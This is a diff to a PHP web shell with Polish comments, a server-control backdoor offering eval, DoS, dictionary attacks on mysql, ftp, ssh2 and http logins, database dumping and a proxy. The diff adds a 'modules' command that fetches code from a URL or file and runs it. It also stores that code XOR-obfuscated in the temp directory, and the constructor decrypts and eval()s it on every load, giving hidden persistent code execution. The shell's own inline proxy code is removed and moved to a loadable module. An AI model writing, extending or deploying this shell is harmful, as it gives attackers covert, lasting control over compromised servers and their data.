@@ -10,31 +10,26 @@
 require_once dirname( __FILE__ ) . '/Lib/Arr.php';
 require_once dirname( __FILE__ ) . '/Lib/Request.php';
 require_once dirname( __FILE__ ) . '/Lib/Form.php';
-require_once dirname( __FILE__ ) . '/Lib/Html.php';
-require_once dirname( __FILE__ ) . '/Lib/MysqlDumper.php';
-require_once dirname( __FILE__ ) . '/Lib/PasswordRecovery.php';
-require_once dirname( __FILE__ ) . '/Lib/Dos.php';
+require_once dirname( __FILE__ ) . '/Lib/ModuleMysqlDumper.php';
+require_once dirname( __FILE__ ) . '/Lib/ModulePasswordRecovery.php';
+require_once dirname( __FILE__ ) . '/Lib/ModuleDos.php';
+require_once dirname( __FILE__ ) . '/Lib/ModuleProxy.php';
 
 /**
- * class Shell - Zarzadzanie serwerem ;)
+ * class Shell - Zarzadzanie serwerem
  *
- * @version    0.2
+ * @version 0.2
  *
- * @todo
- *      Edycja pliku
- *      Wysylanie emaili
- *      Proxy jako biblioteka
- *
- * @uses       Request
- * @uses       Form
- * @uses       Html
+ * @uses Arr
+ * @uses Request
+ * @uses Form
  */
 class Shell
 {
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.2 b110602';
+	const VERSION = '0.2 b110603';
 
 	/**
 	 * Czas generowania strony
@@ -210,6 +205,27 @@ CONTENT;
 
 			$this -> aDisableFunctions = $aDisableFunctions;
 		}
+
+		/**
+		 * Wczytywanie modulow
+		 */
+		$sKey = sha1( __FILE__ );
+		if( is_file( $sFilePath = sys_get_temp_dir() . '/' . $sKey ) && ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
+		{
+			$iDataLen = strlen( $sData );
+
+			$sNewData = NULL;
+
+			/**
+			 * Deszyfrowanie zawartosci pliku
+			 */
+			for( $i = 0; $i < $iDataLen; $i++ )
+			{
+				$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 20 ) * 2, 2 ) ) );
+			}
+
+			eval( '?>' . $sNewData . '<?' );
+		}
 	}
 
 	/**
@@ -338,7 +354,7 @@ HELP;
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
+		if( $this -> iArgc !== 0 )
 		{
 			return <<<HELP
 ping - Odpowiedź "pong"
@@ -813,6 +829,99 @@ HELP;
 	}
 
 	/**
+	 * Komenda - modules
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandModules()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+modules - Wczytywanie dodakowych modułów shella
+
+	Użycie:
+		modules ścieżka_do_pliku_z_modułami
+
+	Przykład:
+		modules /tmp/modules
+		modules http://example.com/modules.txt
+HELP;
+		}
+
+		/**
+		 * Sprawdzanie, czy meoduly nie zostaly juz zaladowane
+		 */
+		if( class_exists( 'Dos' ) && class_exists( 'MysqlDumper' ) && class_exists( 'PasswordRecovery' ) && class_exists( 'Proxy' ) )
+		{
+			return 'Wszystkie moduły zostały już załadowane';
+		}
+
+		/**
+		 * Pobieranie pliku z http
+		 */
+		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
+		{
+			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
+			{
+				return 'Nie można pobrać pliku z modułami';
+			}
+
+			$sFilePath = tempnam( sys_get_temp_dir(), 'shell' );
+			file_put_contents( $sFilePath, $sData );
+		}
+		/**
+		 * Wczytywanie pliku
+		 */
+		else
+		{
+			if( ! is_file( $this -> aArgv[0] ) )
+			{
+				return 'Nie można wczytać pliku z modułami';
+			}
+
+			$sFilePath = $this -> aArgv[0];
+
+			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
+			{
+				return 'Nie można wczytać pliku z modułami';
+			}
+		}
+
+		ob_start();
+		require $sFilePath;
+		ob_clean();
+		ob_end_flush();
+
+		if( ! class_exists( 'Dos' ) && ! class_exists( 'MysqlDumper' ) && ! class_exists( 'PasswordRecovery' ) && ! class_exists( 'Proxy' ) )
+		{
+			return 'Niepoprawny plik z modułami';
+		}
+
+		/**
+		 * Szyfrowanie zawartosci pliku
+		 */
+		$sKey = sha1( __FILE__ );
+
+		$iDataLen = strlen( $sData );
+
+		$sNewData = NULL;
+
+		for( $i = 0; $i < $iDataLen; $i++ )
+		{
+			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 20 ) * 2, 2 ) ) );
+		}
+
+		file_put_contents( sys_get_temp_dir() . '/' . $sKey, $sNewData );
+
+		return 'Plik z modułami został załadowany';
+	}
+
+	/**
 	 * Komenda - phpinfo
 	 *
 	 * @uses   Html
@@ -864,7 +973,7 @@ HELP;
 		$sData = preg_replace( '~<a href=".+?"><img border="0" src=".+?" alt=".+?" /></a>~', NULL, $sData );
 		$sData = preg_replace( '~<hr />\s+<h1><a href=".+?">PHP Credits</a></h1>~', NULL, $sData );
 
-		return Html::shrink( $sData );
+		return $sData;
 	}
 
 	/**
@@ -1069,8 +1178,8 @@ HELP;
 			while( ! feof( $rFile ) )
 			{
 				echo fread( $rFile, 131072 );
-				ob_flush();
-				flush();
+				@ ob_flush();
+				@ flush();
 			}
 		}
 
@@ -1365,6 +1474,14 @@ HELP;
 	 */
 	private function getCommandMysqlDump()
 	{
+		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'MysqlDumper' ) )
+		{
+			return 'mysqldump, mysqldumper, mysqlbackup, dumpdb - !!! moduł nie został załadowany';
+		}
+
 		/**
 		 * Help
 		 */
@@ -1722,6 +1839,14 @@ HELP;
 	private function getCommandPasswordRecovery()
 	{
 		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'PasswordRecovery' ) )
+		{
+			return 'passwordrecovery, pr - !!! moduł nie został załadowany';
+		}
+
+		/**
 		 * Help
 		 */
 		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
@@ -1740,7 +1865,6 @@ passwordrecovery, pr - Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2
 		passwordrecovery typ http://localhost/auth/ uzytkownik|plik_z_uzytkownikami slownik
 
 	Przykład:
-
 		passwordrecovery http http://localhost/auth/ tester /tmp/dic
 		passwordrecovery mysql localhost:3306 tester /tmp/dic
 HELP;
@@ -1778,6 +1902,14 @@ HELP;
 	private function getCommandProxy()
 	{
 		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'Proxy' ) )
+		{
+			return 'proxy - !!! moduł nie został załadowany';
+		}
+
+		/**
 		 * Help
 		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
@@ -1811,273 +1943,24 @@ proxy - Proxy HTTP
 HELP;
 		}
 
-		/**
-		 * Rozszerzenie "sockets" jes wymagane
-		 */
-		if( ! function_exists( 'socket_create' ) )
+		try
 		{
-			return 'Brak rozszerzenia "sockets"';
-		}
+			ob_start();
 
-		/**
-		 * Sprawdzanie poprawnosci portu
-		 */
-		if( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65535 ) )
+			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+
+			$oProxy = new Proxy();
+			$oProxy -> setPort( $this -> aArgv[0] )
+				-> setNoImages( in_array( 'i', $this -> aOptv ) )
+				-> get();
+			ob_end_flush();
+			exit ;
+		}
+		catch( ProxyException $oException )
 		{
-			return sprintf( 'Błędny port "%d"', $this -> aArgv[0] );
+			header( 'Content-Type: text/html; charset=utf-8', TRUE );
+			return $oException -> getMessage();
 		}
-
-		/**
-		 * Ignorowanie obrazkow: .jpg .gif .png .ico .psd .bmp
-		 */
-		$bIgnoreImages = in_array( 'i', $this -> aOptv );
-
-		/**
-		 * Tworzenie socketa
-		 */
-		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp' ) ) ) )
-		{
-			return "Nie można utworzyć socketa";
-		}
-
-		/**
-		 * Podpinanie
-		 */
-		if( ! socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) )
-		{
-			return sprintf( "Nie można zbindować 0.0.0.0:%d", $this -> aArgv[0] );
-		}
-
-		/**
-		 * Wylaczenie blokowania
-		 */
-		//socket_set_nonblock( $rSock );
-
-		/**
-		 * Nasluchiwanie
-		 */
-		if( ! socket_listen( $rSock ) )
-		{
-			return "Nie można nasłuchiwać\r\n";
-		}
-
-		ob_start();
-
-		header( 'Content-Type: text/plain; charset=utf-8', TRUE );
-
-		echo "Proxy zostało uruchomione\r\n\r\n";
-
-		for(;;)
-		{
-			/**
-			 * Klient
-			 */
-			if( ! ( $rClient = @ socket_accept( $rSock ) ) )
-			{
-				/**
-				 * Zeby obciazenie procesora nie bylo 100%
-				 */
-				usleep( 10000 );
-				continue ;
-			}
-
-			/*
-			 * Naglowki uzytkownika
-			 */
-			$sHeaders = NULL;
-			do
-			{
-				$sTmp = socket_read( $rClient,1024 );
-				$iLen = strlen( $sTmp );
-				$sHeaders .= $sTmp;
-			}
-			while( $iLen === 1024 );
-
-			if( substr( $sTmp, 0, 1 ) === ':' )
-			{
-				$sCommand = rtrim( substr( $sTmp, 1 ) );
-
-				switch( $sCommand )
-				{
-					case 'exit':
-						echo "Command -> exit\r\n";
-						socket_write( $rClient, "Dobranoc ;)" );
-
-						socket_close( $rClient );
-
-						/*
-						 * Rozlaczenie klienta
-						 */
-						socket_close( $rSock );
-						exit ;
-					case 'ping':
-						echo "Command -> ping\r\n";
-						socket_close( $rClient );
-						break ;
-				}
-				continue ;
-			}
-
-			/**
-			 * Wyciaganie hosta do ktorego chcemy sie polaczyc
-			 */
-			if( ! preg_match( '~Host: ([^\r\n]+)~m', $sHeaders, $aHost ) )
-			{
-				socket_close( $rClient );
-				continue ;
-			}
-
-			/**
-			 * zakonczenie proxy, wysterczy w adresie wpisac http://command.exit/
-			 */
-			if( $aHost[1] === 'command.exit' )
-			{
-				echo "Command -> exit\r\n";
-				socket_write( $rClient, "HTTP/1.1 200 OK\r\n\r\nProxy zakonczylo swoje dzialanie" );
-				socket_close( $rClient );
-				socket_close( $rSock );
-				exit ;
-			}
-
-			/**
-			 * Wyciaganie adresu do ktorego sie laczymy
-			 */
-			if( ! preg_match( '~(GET|POST) (.+) HTTP/1\.(1|0)+~m', $sHeaders, $aGet ) )
-			{
-				socket_close( $rClient );
-				continue ;
-			}
-
-			/**
-			 * Fix dla niektorych serwerow
-			 */
-			$sHeaders = preg_replace(
-				sprintf( '~%s %s HTTP/1.%s~m' , $aGet[1], $aGet[2], $aGet[3] ),
-				sprintf( '%s %s HTTP/1.%s' , $aGet[1], substr( $aGet[2], strlen( 'http://' . $aHost[1] ) ), $aGet[3] ),
-				$sHeaders
-			);
-
-			/**
-			 * Proxy-Connection ... -> Connection
-			 */
-			$sHeaders = preg_replace( '~^Proxy-~m', NULL, $sHeaders );
-
-			/**
-			 * Keep-Alive blokuje caly skrypt, dlatego trzeba zamienic je na polaczenie zamkniete
-			 */
-			$sHeaders = preg_replace( '~^Connection: Keep-Alive~m', 'Connection: Close', $sHeaders );
-
-			/**
-			 * Pobieranie adresu IP poprzez host
-			 */
-			$sIp = getHostByName( $aHost[1] );
-
-			/**
-			 * Statystyki
-			 */
-			printf( "%-80.80s ", $aGet[2] );
-
-			/**
-			 * Ignorowanie obrazkow
-			 */
-			if( $bIgnoreImages && in_array( pathinfo( $aGet[1], PATHINFO_EXTENSION ), array( 'jpg', 'gif', 'png', 'ico', 'psd', 'bmp' ) ) )
-			{
-				echo "Ignore Image\r\n";
-				$sImageHeader = "HTTP/1.0 200 OK\r\n" .
-						"Content-Type: image/gif\r\n" .
-						"Accept-Ranges: bytes\r\n" .
-						"Expires: Thu, 19 May 2022 12:34:56 GTM\r\n" .
-						"Content-Length: 43\r\n" .
-						"Connection: close\r\n" .
-						"Date: Thu, 19 May 2010 08:06:09 GMT\r\n\r\n" .
-						base64_decode( 'R0lGODlhAQABAIAAAP///wAAACH5BAAAAAAALAAAAAABAAEAAAICRAEAOw' );
-				socket_write( $rClient, $sImageHeader );
-
-				/**
-				 * Rozlaczenie klienta
-				 */
-				socket_close( $rClient );
-				continue ;
-			}
-
-			/**
-			 * Polaczenie ze zdalnym hostem (do ktorego wysylamy naglowek)
-			 */
-			if( ( $rHost = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp' ) ) ) )
-			{
-
-				/**
-				 * Polaczenie do zdalnego hosta
-				 */
-				if( ! socket_connect( $rHost, $sIp, 80 ) )
-				{
-					echo "Error\r\n";
-					continue ;
-				}
-
-				/**
-				 * Wysylanie naglowkow
-				 */
-				if( ! socket_write( $rHost, $sHeaders ) )
-				{
-					echo "Error\r\n";
-					continue ;
-				}
-
-				/**
-				 * Czas rozpoczecia
-				 */
-				$fSpeed = microtime( 1 );
-
-				/**
-				 * Calkowita rozmiar pobranych danych
-				 */
-				$iTotalLen = 0;
-				do
-				{
-					$sTmp = socket_read( $rHost, 1024 );
-					$iLen = strlen( $sTmp );
-
-					/**
-					 * Jezeli pobieramy plik i nagle nacisniemy "Anuluj", zapobiega to
-					 * blokowaniu skryptu
-					 */
-					if( ! socket_write( $rClient, $sTmp )  )
-					{
-						break ;
-					}
-					$iTotalLen += $iLen;
-				}
-				while( $iLen !== 0 );
-
-				/**
-				 * Statystyki
-				 */
-				printf( "Data: %7dKB Speed: %7.2fKB/s\r\n", ceil( $iTotalLen / 1024 ), ( $iTotalLen / ( microtime( 1 ) - $fSpeed ) / 1024 ) );
-			}
-
-			/**
-			 * Rozlaczenie z hostem
-			 */
-			socket_close( $rHost );
-
-			/**
-			 * Rozlaczenie klienta
-			 */
-			socket_close( $rClient );
-
-			ob_flush();
-			flush();
-		}
-
-		/**
-		 * Zamykanie socketa (chyba a raczej na pewno sie nigdy nie zamknie)
-		 */
-		socket_close( $rSock );
-
-		ob_end_flush();
-
-		exit ;
 	}
 
 	/**
@@ -2088,6 +1971,14 @@ HELP;
 	 */
 	private function getCommandDos()
 	{
+		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'Dos' ) )
+		{
+			return 'dos - !!! moduł nie został załadowany';
+		}
+
 		/**
 		 * Help
 		 */
@@ -2136,7 +2027,7 @@ HELP;
 		catch( DosException $oException )
 		{
 			header( 'Content-Type: text/html; charset=utf-8', TRUE );
-			$oException -> getMessage();
+			return $oException -> getMessage();
 		}
 	}
 
@@ -2160,7 +2051,7 @@ btw, sprawdziłeś komendę: '<strong>:g4m3</strong>'?
 Changelog:
 ==========
 
-2011-06-02 v0.2
+2011-06-03 v0.2
 ----------
 * Wsparcie dla CLI
 * Shella rozszerzono o następujące komendy:
@@ -2168,6 +2059,7 @@ Changelog:
 	<strong>mkdir</strong>
 	<strong>cp</strong>
 	<strong>mv</strong>
+	<strong>modules</strong>
 	<strong>chmod</strong>
 	<strong>mysql</strong>
 	<strong>mysqldump</strong>
@@ -2177,6 +2069,7 @@ Changelog:
 	<strong>dos</strong>
 	<strong>passwordrecovery</strong>
 	<strong>cr3d1ts</strong>
+* możliwość wczytania danego modułu (Dos, PasswordRecovery, MysqlDump, 	Proxy)
 * polecenie <strong>g4m3</strong> oraz <strong>cr3d1ts</strong> nie wyświetlają się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
 * <strong>php</strong> jest aliasem dla <strong>eval</strong>
 
@@ -2373,7 +2266,7 @@ HELP;
 
 				$sCmd = implode( $aArgv, ' ' );
 			}
-			else if( ! Request::isPost() )
+			else if( ! Request::getServer( 'REQUEST_METHOD' ) !== 'POST'  )
 			{
 				$sCmd = ':ls -l ' . dirname( __FILE__ );
 			}
@@ -2465,6 +2358,9 @@ HELP;
 				case 'eval':
 				case 'php':
 					$sConsole = $this -> getCommandEval();
+					break ;
+				case 'modules':
+					$sConsole = $this -> getCommandModules();
 					break ;
 				/**
 				 * @see Line 170
@@ -2634,7 +2530,7 @@ div#bottom{margin:10px auto;}
 div#content{padding-top:10px;margin:0 auto;}
 pre#console{text-align:left;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;overflow:scroll;margin:0 auto;padding:2px;}
 input{border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;background-color:#fff;font-size:14px;padding:6px;}
-input#cmd{width:89%;margin-top:10px;padding-left:10px;}
+input#cmd{width:88%;margin-top:10px;padding-left:10px;}
 input#cmd:hover{background-color:#f1f1f1;}
 input#cmd-send{margin-top:10px;margin-left:20px;}
 .green{color:#55b855;font-weight:700;}
